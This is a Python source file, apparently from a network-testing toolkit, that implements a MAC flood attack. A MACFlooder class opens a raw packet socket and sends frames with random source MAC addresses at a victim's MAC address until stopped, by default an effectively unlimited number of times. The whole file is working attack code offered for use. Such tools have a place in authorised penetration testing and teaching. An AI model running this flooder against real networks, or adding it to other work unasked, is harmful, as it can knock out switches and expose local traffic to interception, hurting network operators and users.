#!/usr/bin/env python3
#
# This program is free software: you can redistribute it and/or modify
# it under the terms of the GNU General Public License version 3 as
# published by the Free Software Foundation.
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program.  If not, see <http://www.gnu.org/licenses/>.
#
# Written by:
#        Nadzeya Hutsko <nadzya.info@gmail.com>
"""The module for  class"""


import socket
import sys
import logging

from .helpers import (
    random_MAC,
    make_valid_mac_address,
    progress_bar,
    get_description_from_wiki,
)

_LOGGER = logging.getLogger(__name__)


class MACFlooder:  # pylint: disable=R0903
    """A class that represents a MAC flood attach"""

    def __init__(self, interface, dst_mac, count=None):
        """
        Initialaze a MAC flood object

        :interface: your network interface that is connected
                    to the tested network (i.e wlan0)
        :your_mac: victim's MAC-address (b"\xbb\xbb\xbb\xbb\xbb\xbb"
                                         == bb:bb:bb:bb:bb:bb)
        """
        self.interface = interface
        self.dst_mac = make_valid_mac_address(dst_mac)
        if count is None:
            self.count = 9_223_372_036_854_775_807
        else:
            self.count = int(count)
        if interface and dst_mac and count:
            _LOGGER.debug(
                "Creating an MACFlooder object with your interface %s"
                " and victim's MAC-address %s",
                self.interface,
                dst_mac,
            )
        description = get_description_from_wiki("MAC flood")
        if "does not match any pages" in description:
            _LOGGER.error(description)
            sys.exit(1)
        self.description = description

    def run(self):
        """
        Run the MAC flood attack until KeyboardInterrupt
        or the number of all packets is sent
        """
        total = 0
        _LOGGER.info(
            "Trying to send %i packets. Press Ctrl+C to "
            "stop before all the packets will be sent",
            self.count,
        )

        sock = socket.socket(
            socket.AF_PACKET, socket.SOCK_RAW, socket.htons(3)
        )
        sock.bind((self.interface, socket.htons(0x0800)))
        protocol = b"\x88\xb5"
        payload = "PAYLOAD".encode()
        for x in range(0, self.count):  # pylint: disable=C0103
            try:
                rand_mac = random_MAC()
                src_mac = make_valid_mac_address(rand_mac)
                sock.sendall(self.dst_mac + src_mac + protocol + payload)
                _LOGGER.debug(
                    "Sending a packet #%i with source_MAC %s",
                    x + 1,
                    rand_mac,
                )
                progress_bar(x, self.count)
                total += 1
            except KeyboardInterrupt:
                _LOGGER.info("\nTotal packets sent: %i\n", total)
                _LOGGER.warning("\nStopping MAC flood attack")
                sys.exit(0)

        progress_bar(self.count, self.count)
        _LOGGER.info("\nTotal packets sent: %i\n", total)
